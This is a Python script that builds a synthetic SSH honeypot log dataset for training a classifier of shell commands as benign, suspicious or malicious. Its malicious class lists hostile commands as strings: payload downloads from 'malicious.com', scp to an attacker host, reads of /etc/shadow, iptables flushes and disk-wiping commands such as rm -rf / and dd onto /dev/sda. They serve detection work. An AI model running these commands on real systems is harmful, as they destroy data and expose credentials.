#!/usr/bin/env python3
import json
import random
import datetime
import os
import argparse

# Set dataset directory
DATASET_DIR = "model_assets"
os.makedirs(DATASET_DIR, exist_ok=True)  # Ensure directory exists

def random_ip():
    return ".".join(str(random.randint(1, 255)) for _ in range(4))

def random_task():
    return f"Task-{random.randint(1000, 9999)}"

# Define command classification and log level mapping with balanced classes
command_classification = {
    # Benign commands
    "ls": ("BENIGN", "INFO"),
    "ls -al": ("BENIGN", "INFO"),
    "whoami": ("BENIGN", "INFO"),
    "pwd": ("BENIGN", "INFO"),
    "echo 'hello'": ("BENIGN", "INFO"),
    "mkdir test": ("BENIGN", "INFO"),
    "ifconfig": ("BENIGN", "INFO"),
    "ping google.com": ("BENIGN", "INFO"),
    "df -h": ("BENIGN", "INFO"),
    "du -sh": ("BENIGN", "INFO"),
    "find / -name 'test'": ("BENIGN", "INFO"),
    "top -n 1": ("BENIGN", "INFO"),

    # Suspicious commands
    "uname -a": ("SUSPICIOUS", "WARNING"),
    "ps aux": ("SUSPICIOUS", "WARNING"),
    "netstat -tulnp": ("SUSPICIOUS", "WARNING"),
    "sudo su": ("SUSPICIOUS", "WARNING"),
    "sudo -l": ("SUSPICIOUS", "WARNING"),
    "cd /root": ("SUSPICIOUS", "WARNING"),
    
    # Malicious commands (Expanded List)
    "cat /etc/passwd": ("MALICIOUS", "ERROR"),
    "cat /etc/shadow": ("MALICIOUS", "ERROR"),
    "grep 'password' /etc/passwd": ("MALICIOUS", "ERROR"),
    "wget http://malicious.com/payload.sh": ("MALICIOUS", "ERROR"),
    "curl -O http://malicious.com/malware.bin": ("MALICIOUS", "ERROR"),
    "rm -rf /": ("MALICIOUS", "ERROR"),
    "mv /bin/bash /tmp/bash": ("MALICIOUS", "ERROR"),
    "chmod 777 /etc/shadow": ("MALICIOUS", "ERROR"),
    "chmod 777 /etc/passwd": ("MALICIOUS", "ERROR"),
    "scp file.txt attacker@remote:/tmp/": ("MALICIOUS", "ERROR"),
    "ssh -L 8080:target.com:80 attacker@remote": ("MALICIOUS", "ERROR"),
    "iptables -F": ("MALICIOUS", "ERROR"),
    "iptables --flush": ("MALICIOUS", "ERROR"),
    "echo 'hacked' > /root/.bashrc": ("MALICIOUS", "ERROR"),
    "dd if=/dev/zero of=/dev/sda": ("MALICIOUS", "ERROR"),
    "rm -rf /* --no-preserve-root": ("MALICIOUS", "ERROR"),
    "echo 'malware' > /tmp/malware.sh": ("MALICIOUS", "ERROR")
}


def augment_command(command):
    """Return an augmented version of the command by applying random modifications."""
    if random.random() < 0.3:
        command = command.upper() if random.random() < 0.5 else command.lower()
    if random.random() < 0.3:
        command = " " + command if random.random() < 0.5 else command + " "
    words = command.split()
    if len(words) > 1 and random.random() < 0.3:
        i = random.randint(0, len(words) - 2)
        words[i] = words[i] + "  "  # Extra space
        command = " ".join(words)
    return command

def generate_log_entry():
    command, (classification, log_level) = random.choice(list(command_classification.items()))
    if random.random() < 0.5:  # 50% chance to augment the command
        command = augment_command(command)
    log_entry = {
        "timestamp": datetime.datetime.utcnow().isoformat() + "Z",
        "level": log_level,
        "task_name": random_task(),
        "src_ip": random_ip(),
        "src_port": random.randint(1024, 65535),
        "dst_ip": "192.168.1.100",
        "dst_port": 22,
        "event": "Session summary",  # Used by the parser filter
        "details": command,          # Using the command as the details
        "judgement": classification, # Using classification as the judgement
        "sensor_name": "my_honeypot",
        "sensor_protocol": "ssh",
        "command": command,
        "classification": classification,
        "prediction": f"[[{random.uniform(0, 1):.2f}, {random.uniform(0, 1):.2f}, {random.uniform(0, 1):.2f}]]"
    }
    return log_entry

def generate_logs(num_logs):
    logs = [generate_log_entry() for _ in range(num_logs)]
    log_file_path = os.path.join(DATASET_DIR, "honeypot_logs.json")
    with open(log_file_path, "w") as f:
        json.dump(logs, f, indent=4)
    return logs, log_file_path

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Generate honeypot log dataset.")
    parser.add_argument("--num_logs", type=int, default=50000, help="Number of log entries to generate (default: 50000)")
    args = parser.parse_args()
    
    logs, log_file_path = generate_logs(args.num_logs)
    print(f"✅ Honeypot logs saved to: {log_file_path}")
